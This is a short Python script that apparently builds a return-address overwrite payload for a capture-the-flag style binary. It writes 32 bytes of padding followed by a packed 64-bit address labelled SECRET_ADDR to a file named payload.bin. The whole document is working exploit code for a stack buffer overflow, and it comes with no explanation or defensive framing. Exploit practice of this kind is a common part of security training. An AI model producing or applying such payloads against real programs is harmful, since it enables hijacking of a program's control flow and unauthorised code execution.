import struct

OFFSET = 32
SECRET_ADDR = 0x401176

payload = b"A" * OFFSET
payload += struct.pack("<Q", SECRET_ADDR)

with open("payload.bin", "wb") as f:
    f.write(payload)